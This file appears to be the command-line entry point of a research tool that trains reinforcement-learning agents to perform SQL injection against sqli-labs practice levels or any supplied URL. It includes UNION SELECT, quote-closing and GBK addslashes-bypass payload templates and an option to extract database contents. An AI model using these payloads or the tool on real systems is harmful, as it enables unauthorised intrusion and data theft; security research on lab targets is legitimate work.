"""
agent.py  —  SeqSQLi v2 entry point
=====================================
CLI only. All logic lives inside the seqsqli/ package.

Usage:
    python agent.py --less 27 --episodes 300
    python agent.py --less 27 --episodes 300 --no-fingerprint
    python agent.py --url http://target/vuln.php --param id
    python agent.py --less 1 --extract --load
    python agent.py --all --episodes 200
"""

import argparse
import json
import numpy as np


class _NumpyEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, np.integer):
            return int(o)
        if isinstance(o, np.floating):
            return float(o)
        if isinstance(o, np.ndarray):
            return o.tolist()
        return super().default(o)


from seqsqli.config import (
    DEFAULT_BASE_URL, MAX_EPISODES, QTABLE_PATH, RESULTS_PATH,
)
from seqsqli.core.profile import LESS_PRESETS
from seqsqli.core.fingerprint import Fingerprinter
from seqsqli.core.http import get_request_count
from seqsqli.rl.qlearning import save_q_table, load_q_table
from seqsqli.rl.train import train
from seqsqli.rl.train_ppo import train_ppo, greedy_eval_ppo, PPO_MODEL_PATH
from seqsqli.rl.train_trpo import train_trpo, greedy_eval_trpo, TRPO_MODEL_PATH
from seqsqli.rl.train_a2c import train_a2c, greedy_eval_a2c, A2C_MODEL_PATH
from seqsqli.rl.evaluate import evaluate, greedy_eval, analyze_q_table, analyze_ordering
from seqsqli.extractor import DataExtractor
from seqsqli.builder import build_target_from_preset, build_target_from_args

# ---------------------------------------------------------------------------
# Re-export everything baseline.py needs (keeps baseline.py import unchanged)
# ---------------------------------------------------------------------------
from seqsqli.core.mutations import MUTATIONS, ACTION_LIST, FILTER_MUTATION_HINTS
from seqsqli.core.profile import TargetProfile, LESS_PRESETS
from seqsqli.core.http import send_request
from seqsqli.core.response import classify_response
from seqsqli.rl.state import encode_state
from seqsqli.rl.qlearning import Q
from seqsqli.builder import LESS_TARGETS, send_payload, analyze_response


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _apply_no_fingerprint(target, less_id=None):
    """Build base_payload from preset info without hitting the server."""
    target.columns         = 3
    target.injectable_cols = [2, 3]
    q  = target.quote
    c  = target.closure
    ft = target.filter_type

    if ft == "addslashes_gbk":
        q = "%bf%27"

    needs_quote_close = ft in (
        "union_select_comments_spaces",
        "comments_spaces_or_and",
    )

    if target.method == "POST":
        target.base_payload = f"admin{q}{c} --+"
    elif needs_quote_close and q:
        target.base_payload = f"0{q}{c} UNION SELECT 1,2,{q}3"
        target.suffix = "QUOTE_CLOSE"
    else:
        target.base_payload = f"0{q}{c} UNION SELECT 1,2,3--+"

    return target


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SeqSQLi v2 — RL-based SQL Injection Agent",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python agent.py --less 25 --episodes 300
  python agent.py --less 27 --episodes 300 --no-fingerprint
  python agent.py --url http://target/vuln.php --param id
  python agent.py --less 1 --extract --load
  python agent.py --all --episodes 200
""",
    )

    grp = parser.add_mutually_exclusive_group()
    grp.add_argument("--less",  type=float, help="sqli-labs Less level (e.g. 25, 26)")
    grp.add_argument("--all",   action="store_true", help="Train on all Less presets")
    grp.add_argument("--url",   type=str,   help="Custom target URL")

    parser.add_argument("--param",          type=str, default="id")
    parser.add_argument("--method",         type=str, default="GET", choices=["GET", "POST"])
    parser.add_argument("--data",           type=str, help="Extra POST params: key=val&key2=val2")
    parser.add_argument("--base-url",       type=str, default=DEFAULT_BASE_URL)
    parser.add_argument("--episodes",       type=int, default=MAX_EPISODES)
    parser.add_argument("--algo",           type=str, default="qlearning",
                        choices=["qlearning", "ppo", "trpo", "a2c"],
                        help="RL algorithm to use (default: qlearning)")
    parser.add_argument("--timesteps",      type=int, default=50_000,
                        help="Total env steps for PPO/TRPO/A2C training (default: 50000)")
    parser.add_argument("--load",           action="store_true", help="Load existing Q-table")
    parser.add_argument("--eval-only",      action="store_true", help="Skip training, greedy eval")
    parser.add_argument("--fingerprint",    action="store_true", help="Fingerprint only, then exit")
    parser.add_argument("--no-fingerprint", action="store_true", help="Skip auto-detection")
    parser.add_argument("--extract",        action="store_true", help="Extract DB data after bypass")
    parser.add_argument("--payloads-csv",   type=str, default=None,
                        help="Path to payload_builder.py CSV for online-WAF training "
                             "(works for both PPO and Q-learning). Each episode samples a "
                             "random validated payload as starting point; strict marker "
                             "SUCCESS is auto-enabled.")
    parser.add_argument("--save-model",      type=str, default=None,
                        help="Path (no extension) to save the PPO/TRPO/A2C model. "
                             "Defaults to the fixed per-algo path. Use a stage-specific "
                             "name for curriculum, e.g. models/ppo_union_stage1.")
    parser.add_argument("--load-model",      type=str, default=None,
                        help="Path (no extension) to a saved PPO/TRPO/A2C model to "
                             "resume from for curriculum Stage-2 fine-tuning.")

    args = parser.parse_args()

    if args.load or args.eval_only:
        load_q_table(QTABLE_PATH)

    # ── ALL MODE ─────────────────────────────────────────────────────────────
    if args.all:
        all_logs = []
        for less_id in sorted(LESS_PRESETS.keys()):
            target = build_target_from_preset(less_id, args.base_url)
            if not args.no_fingerprint:
                fp = Fingerprinter(target)
                target = fp.run()
            else:
                target = _apply_no_fingerprint(target, less_id)

            logs = train(target, args.episodes)
            evaluate(logs)
            all_logs.extend(logs)

        save_q_table(QTABLE_PATH)
        with open(RESULTS_PATH, "w") as f:
            json.dump(all_logs, f, indent=2)
        print(f"\n[*] All results saved to {RESULTS_PATH}")
        print(f"[*] Total HTTP requests: {get_request_count()}")
        exit(0)

    # ── SINGLE TARGET MODE ────────────────────────────────────────────────────
    if args.url:
        target = build_target_from_args(args.url, args.param, args.method, args.data)
    elif args.less is not None:
        if args.less not in LESS_PRESETS:
            print(f"[!] Less-{args.less} not found. Available: {sorted(LESS_PRESETS.keys())}")
            exit(1)
        target = build_target_from_preset(args.less, args.base_url)
    else:
        parser.print_help()
        exit(0)

    # Fingerprinting
    if not args.no_fingerprint:
        print(f"\n{'='*60}\n FINGERPRINTING\n{'='*60}")
        fp = Fingerprinter(target)
        target = fp.run()
    elif args.less is not None:
        target = _apply_no_fingerprint(target, args.less)

    if args.fingerprint:
        print("\n[*] Fingerprint complete. Exiting.")
        exit(0)

    # Training / evaluation
    if args.algo == "ppo":
        if args.eval_only:
            logs = greedy_eval_ppo(target, model_path=args.load_model or PPO_MODEL_PATH)
            evaluate(logs)
        else:
            logs = train_ppo(target, timesteps=args.timesteps,
                             save_path=args.save_model or PPO_MODEL_PATH,
                             load_path=args.load_model,
                             payloads_csv=args.payloads_csv)
            evaluate(logs)

            results_path = f"results_ppo_less{args.less}.json" if args.less else "results_ppo.json"
            with open(results_path, "w") as f:
                json.dump(logs, f, indent=2, cls=_NumpyEncoder)
            print(f"[*] PPO logs saved to {results_path}")

            ordering_path = f"ordering_ppo_less{args.less}.json" if args.less else "ordering_ppo.json"
            analyze_ordering(logs, save_path=ordering_path)

    elif args.algo == "trpo":
        if args.eval_only:
            logs = greedy_eval_trpo(target, model_path=args.load_model or TRPO_MODEL_PATH)
            evaluate(logs)
        else:
            logs = train_trpo(target, timesteps=args.timesteps,
                              save_path=args.save_model or TRPO_MODEL_PATH,
                              load_path=args.load_model,
                              payloads_csv=args.payloads_csv)
            evaluate(logs)

            results_path = f"results_trpo_less{args.less}.json" if args.less else "results_trpo.json"
            with open(results_path, "w") as f:
                json.dump(logs, f, indent=2, cls=_NumpyEncoder)
            print(f"[*] TRPO logs saved to {results_path}")

            ordering_path = f"ordering_trpo_less{args.less}.json" if args.less else "ordering_trpo.json"
            analyze_ordering(logs, save_path=ordering_path)

    elif args.algo == "a2c":
        if args.eval_only:
            logs = greedy_eval_a2c(target, model_path=args.load_model or A2C_MODEL_PATH)
            evaluate(logs)
        else:
            logs = train_a2c(target, timesteps=args.timesteps,
                             save_path=args.save_model or A2C_MODEL_PATH,
                             load_path=args.load_model,
                             payloads_csv=args.payloads_csv)
            evaluate(logs)

            results_path = f"results_a2c_less{args.less}.json" if args.less else "results_a2c.json"
            with open(results_path, "w") as f:
                json.dump(logs, f, indent=2, cls=_NumpyEncoder)
            print(f"[*] A2C logs saved to {results_path}")

            ordering_path = f"ordering_a2c_less{args.less}.json" if args.less else "ordering_a2c.json"
            analyze_ordering(logs, save_path=ordering_path)

    else:  # qlearning (default)
        if args.eval_only:
            greedy_eval(target)
        else:
            logs = train(target, args.episodes,
                         payloads_csv=args.payloads_csv)
            evaluate(logs)
            save_q_table(QTABLE_PATH)

            results_path = f"results_less{args.less}.json" if args.less else "results.json"
            with open(results_path, "w") as f:
                json.dump(logs, f, indent=2, cls=_NumpyEncoder)
            print(f"[*] Logs saved to {results_path}")

            ordering_path = f"ordering_less{args.less}.json" if args.less else "ordering.json"
            analyze_ordering(logs, save_path=ordering_path)

        analyze_q_table()

    # Data extraction
    if args.extract:
        print(f"\n{'='*60}\n DATA EXTRACTION\n{'='*60}")
        extractor = DataExtractor(target)
        report = extractor.run_full_extraction()
        extract_path = f"extract_less{args.less}.json" if args.less else "extract.json"
        with open(extract_path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"\n[*] Extraction report saved to {extract_path}")

    print(f"\n[*] Total HTTP requests: {get_request_count()}")
